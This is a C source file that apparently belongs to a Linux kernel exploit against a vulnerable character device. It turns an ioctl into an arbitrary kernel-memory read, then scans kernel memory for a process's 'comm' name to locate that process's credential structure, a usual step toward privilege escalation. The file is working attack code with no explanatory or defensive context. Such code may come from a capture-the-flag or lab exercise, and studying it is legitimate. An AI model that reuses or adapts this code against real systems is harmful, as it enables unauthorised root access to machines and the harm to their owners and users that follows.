#define _GNU_SOURCE
#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include "blast.h"

typedef struct {
    void *uaddr;
    void *kaddr;
    size_t size;
} msg_t;

long arbitrary_read(int fd, void *user_buf, void *kernel_addr, size_t size) {
    msg_t msg;
    msg.uaddr = user_buf;
    msg.kaddr = kernel_addr;
    msg.size = size;

    return ioctl(fd, IOCTL_READ, &msg);
}

void *blask_for_cred() {
    int fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0) {
        perror("[!] Failed to open device");
        return NULL;
    }

    unsigned long offset = 0;
    const unsigned long kernel_addr = PAGE_OFFSET;
    char read_buffer[BUF_SIZE];
    char *search;
    void *cred_addr = NULL;

    while (1) {
        if (arbitrary_read(fd, read_buffer, (void *)(kernel_addr + offset), BUF_SIZE)) {
            offset += BUF_SIZE;
            continue;
        }
        for (search = read_buffer + 8; search < read_buffer+BUF_SIZE; search += COMM_SIZE) {
            if (memcmp(search, special_comm, COMM_SIZE) == 0) {
                if ((((unsigned long *)search)[-3] > PAGE_OFFSET) && (((unsigned long *)search)[-2] > PAGE_OFFSET)) {
                    cred_addr = (void*)((unsigned long *)search)[-2];
                    goto cleanup;
                }
            }
        }

        offset += BUF_SIZE;
        if (kernel_addr + offset < PAGE_OFFSET) {
            printf("[!] Failed to find comm signature in memory!\n");
            break;
        }
    }

cleanup:
    close(fd);
    return cred_addr;
}